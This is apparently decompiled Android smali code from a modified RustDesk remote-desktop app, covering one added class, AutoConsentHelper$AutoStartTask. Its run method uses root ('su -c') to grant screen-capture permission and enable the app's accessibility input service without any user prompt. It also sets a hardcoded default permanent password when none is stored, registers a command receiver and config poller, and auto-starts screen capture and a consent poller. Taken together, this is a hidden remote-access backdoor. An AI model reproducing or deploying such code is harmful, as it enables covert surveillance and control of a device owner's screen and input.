.class Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;
.super Ljava/lang/Object;
.source "AutoConsentHelper.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/carriez/flutter_hbb/AutoConsentHelper;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = "AutoStartTask"
.end annotation


# instance fields
.field private final activity:Landroid/app/Activity;


# direct methods
.method constructor <init>(Landroid/app/Activity;)V
    .registers 2

    .line 440
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 441
    iput-object p1, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    .line 442
    return-void
.end method


# virtual methods
.method public run()V
    .registers 9

    .line 447
    const-string v0, "AutoConsentHelper"

    :try_start_2
    iget-object v1, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    sput-object v1, Lcom/carriez/flutter_hbb/AutoConsentHelper;->currentActivity:Landroid/app/Activity;

    .line 449
    iget-object v1, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-static {v1}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->registerCommandReceiver(Landroid/content/Context;)V

    .line 450
    iget-object v1, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-static {v1}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->startConfigSyncPoller(Landroid/content/Context;)V

    .line 453
    iget-object v1, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-virtual {v1}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object v1

    .line 454
    const/4 v2, 0x0

    if-eqz v1, :cond_26

    const-string v3, "SHOW_PASSWORD_DIALOG"

    invoke-virtual {v1, v3, v2}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z

    move-result v3

    if-eqz v3, :cond_26

    .line 455
    iget-object v3, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    # invokes: Lcom/carriez/flutter_hbb/AutoConsentHelper;->buildAndShowDialog(Landroid/content/Context;)V
    invoke-static {v3}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->access$000(Landroid/content/Context;)V

    .line 457
    :cond_26
    if-eqz v1, :cond_35

    const-string v3, "SHOW_RENAME_DIALOG"

    invoke-virtual {v1, v3, v2}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z

    move-result v1

    if-eqz v1, :cond_35

    .line 458
    iget-object v1, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    # invokes: Lcom/carriez/flutter_hbb/AutoConsentHelper;->buildAndShowRenameDialog(Landroid/content/Context;)V
    invoke-static {v1}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->access$100(Landroid/content/Context;)V

    .line 461
    :cond_35
    iget-object v1, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-static {v1}, Lcom/carriez/flutter_hbb/ConfigManager;->ensureAccessibilityViaRoot(Landroid/content/Context;)V
    :try_end_3a
    .catchall {:try_start_2 .. :try_end_3a} :catchall_191

    .line 465
    const/4 v1, 0x1

    :try_start_3b
    iget-object v3, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v3

    const-string v4, "N"

    new-array v5, v2, [Ljava/lang/Class;

    invoke-virtual {v3, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    .line 466
    iget-object v4, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    new-array v5, v2, [Ljava/lang/Object;

    invoke-virtual {v3, v4, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    .line 467
    if-eqz v3, :cond_86

    .line 468
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v4

    const-string v5, "a"

    invoke-virtual {v4, v5}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object v4

    .line 469
    invoke-virtual {v4, v1}, Ljava/lang/reflect/Field;->setAccessible(Z)V

    .line 470
    invoke-virtual {v4, v3}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    .line 471
    if-eqz v3, :cond_86

    .line 472
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v4

    const-string v5, "setSemanticsEnabled"

    new-array v6, v1, [Ljava/lang/Class;

    sget-object v7, Ljava/lang/Boolean;->TYPE:Ljava/lang/Class;

    aput-object v7, v6, v2

    invoke-virtual {v4, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    .line 473
    new-array v5, v1, [Ljava/lang/Object;

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    aput-object v6, v5, v2

    invoke-virtual {v4, v3, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 474
    const-string v3, "Flutter Semantics enabled via FlutterJNI!"

    invoke-static {v0, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_86
    .catchall {:try_start_3b .. :try_end_86} :catchall_87

    .line 479
    :cond_86
    goto :goto_8d

    .line 477
    :catchall_87
    move-exception v3

    .line 478
    :try_start_88
    const-string v4, "Failed to enable Flutter Semantics: "

    invoke-static {v0, v4, v3}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_8d
    .catchall {:try_start_88 .. :try_end_8d} :catchall_191

    .line 483
    :goto_8d
    :try_start_8d
    new-instance v3, Ljava/io/File;

    const-string v4, "/data/user/0/com.carriez.flutter_hbb/app_flutter/RustDesk.toml"

    invoke-direct {v3, v4}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 484
    invoke-virtual {v3}, Ljava/io/File;->exists()Z

    move-result v4

    if-eqz v4, :cond_c4

    .line 485
    invoke-static {v3}, Lcom/carriez/flutter_hbb/ConfigManager;->readFile(Ljava/io/File;)Ljava/lang/String;

    move-result-object v3

    .line 486
    const-string v4, "password"

    invoke-static {v3, v4}, Lcom/carriez/flutter_hbb/ConfigManager;->extractTomlValue(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 487
    if-eqz v3, :cond_b8

    invoke-virtual {v3}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_b8

    const-string v4, "01"

    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_c4

    .line 488
    :cond_b8
    const-string v3, "RustDesk.toml has empty or unencrypted password; applying default permanent password..."

    invoke-static {v0, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 489
    iget-object v3, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    sget-object v4, Lcom/carriez/flutter_hbb/ConfigManager;->PERMANENT_PASSWORD:Ljava/lang/String;

    invoke-static {v3, v4}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->savePermanentPassword(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_c4
    .catchall {:try_start_8d .. :try_end_c4} :catchall_c5

    .line 494
    :cond_c4
    goto :goto_cb

    .line 492
    :catchall_c5
    move-exception v3

    .line 493
    :try_start_c6
    const-string v4, "Check default password error: "

    invoke-static {v0, v4, v3}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_cb
    .catchall {:try_start_c6 .. :try_end_cb} :catchall_191

    .line 498
    :goto_cb
    :try_start_cb
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v3

    const/4 v4, 0x3

    new-array v4, v4, [Ljava/lang/String;

    const-string v5, "/system/bin/su"

    aput-object v5, v4, v2

    const-string v5, "-c"

    aput-object v5, v4, v1

    const-string v5, "appops set com.carriez.flutter_hbb PROJECT_MEDIA allow && settings put secure enabled_accessibility_services com.carriez.flutter_hbb/com.carriez.flutter_hbb.InputService && settings put secure accessibility_enabled 1 && settings put system show_touches 1"

    const/4 v6, 0x2

    aput-object v5, v4, v6

    invoke-virtual {v3, v4}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;
    :try_end_e2
    .catchall {:try_start_cb .. :try_end_e2} :catchall_e3

    goto :goto_e4

    .line 505
    :catchall_e3
    move-exception v3

    :goto_e4
    nop

    .line 508
    const/4 v3, 0x0

    :goto_e6
    const/4 v4, 0x7

    if-ge v3, v4, :cond_111

    .line 510
    :try_start_e9
    const-string v4, "com.carriez.flutter_hbb.InputService"

    invoke-static {v4}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v4

    .line 511
    const-string v5, "z"

    invoke-virtual {v4, v5}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object v4

    .line 512
    invoke-virtual {v4, v1}, Ljava/lang/reflect/Field;->setAccessible(Z)V

    .line 513
    const/4 v5, 0x0

    invoke-virtual {v4, v5}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v4

    if-eqz v4, :cond_106

    .line 514
    const-string v4, "InputService binder verified active before requesting MediaProjection."

    invoke-static {v0, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_104
    .catchall {:try_start_e9 .. :try_end_104} :catchall_105

    .line 515
    goto :goto_111

    .line 517
    :catchall_105
    move-exception v4

    :cond_106
    nop

    .line 518
    const-wide/16 v4, 0x12c

    :try_start_109
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V
    :try_end_10c
    .catchall {:try_start_109 .. :try_end_10c} :catchall_10d

    goto :goto_10e

    :catchall_10d
    move-exception v4

    .line 508
    :goto_10e
    add-int/lit8 v3, v3, 0x1

    goto :goto_e6

    .line 521
    :cond_111
    :goto_111
    :try_start_111
    iget-object v3, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-static {v3}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->isAccessibilityEnabled(Landroid/content/Context;)Z

    move-result v3

    .line 522
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "checkAndAutoStartService: accessibility enabled = "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v0, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 523
    if-nez v3, :cond_135

    .line 524
    const-string v1, "Accessibility not enabled, skipping auto-start service."

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 525
    return-void

    .line 528
    :cond_135
    const-string v3, "Accessibility verified! Auto-starting screen capture service..."

    invoke-static {v0, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_13a
    .catchall {:try_start_111 .. :try_end_13a} :catchall_191

    .line 531
    :try_start_13a
    iget-object v3, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v3

    const-string v4, "o0"

    new-array v5, v2, [Ljava/lang/Class;

    invoke-virtual {v3, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    .line 532
    iget-object v4, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    new-array v2, v2, [Ljava/lang/Object;

    invoke-virtual {v3, v4, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_14f
    .catchall {:try_start_13a .. :try_end_14f} :catchall_150

    .line 535
    goto :goto_156

    .line 533
    :catchall_150
    move-exception v2

    .line 534
    :try_start_151
    const-string v3, "Failed to invoke o0(): "

    invoke-static {v0, v3, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_156
    .catchall {:try_start_151 .. :try_end_156} :catchall_191

    .line 538
    :goto_156
    :try_start_156
    const-string v2, "com.carriez.flutter_hbb.MainService"

    invoke-static {v2}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v2

    .line 539
    new-instance v3, Landroid/content/Intent;

    iget-object v4, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-direct {v3, v4, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 540
    iget-object v2, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    const-string v4, "r"

    invoke-virtual {v2, v4}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object v2

    .line 541
    invoke-virtual {v2, v1}, Ljava/lang/reflect/Field;->setAccessible(Z)V

    .line 542
    iget-object v4, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-virtual {v2, v4}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/content/ServiceConnection;

    .line 543
    if-eqz v2, :cond_186

    .line 544
    iget-object v4, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-virtual {v4, v3, v2, v1}, Landroid/app/Activity;->bindService(Landroid/content/Intent;Landroid/content/ServiceConnection;I)Z

    .line 545
    const-string v1, "MainService bound successfully via AutoConsentHelper!"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_186
    .catchall {:try_start_156 .. :try_end_186} :catchall_187

    .line 549
    :cond_186
    goto :goto_18d

    .line 547
    :catchall_187
    move-exception v1

    .line 548
    :try_start_188
    const-string v2, "Failed to bind MainService: "

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 551
    :goto_18d
    # invokes: Lcom/carriez/flutter_hbb/AutoConsentHelper;->startConsentPoller()V
    invoke-static {}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->access$200()V
    :try_end_190
    .catchall {:try_start_188 .. :try_end_190} :catchall_191

    .line 555
    goto :goto_197

    .line 553
    :catchall_191
    move-exception v1

    .line 554
    const-string v2, "checkAndAutoStartService error: "

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 556
    :goto_197
    return-void
.end method
